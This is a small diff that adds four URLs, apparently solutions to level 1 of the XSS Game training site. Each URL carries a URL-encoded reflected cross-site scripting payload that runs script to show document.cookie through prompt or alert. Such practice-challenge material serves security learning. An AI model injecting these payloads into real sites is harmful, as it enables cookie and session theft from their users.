@@ -1,0 +1,8 @@
+https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
+
+https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Eprompt(document.cookie)%3C/script%3E
+
+https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
